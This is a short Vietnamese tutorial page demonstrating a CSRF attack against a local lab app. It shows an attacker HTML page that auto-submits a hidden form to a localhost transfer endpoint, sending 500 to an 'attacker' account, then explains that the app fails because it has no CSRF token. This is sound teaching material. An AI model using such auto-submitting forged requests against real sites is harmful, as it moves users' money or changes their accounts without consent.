Demo CSRF Attack

Mở file attacker/csrf_attack.html trong browser (tab khác) khi đã đăng nhập. Page đó sẽ tự động gửi request chuyển tiền!

attacker/csrf_attack.html HTML
<!-- Attacker's page --> <form action="http://localhost:5000/csrf/vulnerable/transfer" method="POST" id="csrf-form"> <input type="hidden" name="to_username" value="attacker"> <input type="hidden" name="amount" value="500"> </form> <script> document.getElementById('csrf-form').submit(); </script>

Tại sao bị lỗi?

  • Không có CSRF token: Server không xác minh request đến từ đâu
  • Cookie tự động gửi: Browser gửi session cookie cho mọi request đến domain
  • Attacker tạo page giả: Auto-submit form đến endpoint vulnerable
  • Hậu quả: Chuyển tiền, đổi password, xóa tài khoản mà user không biết
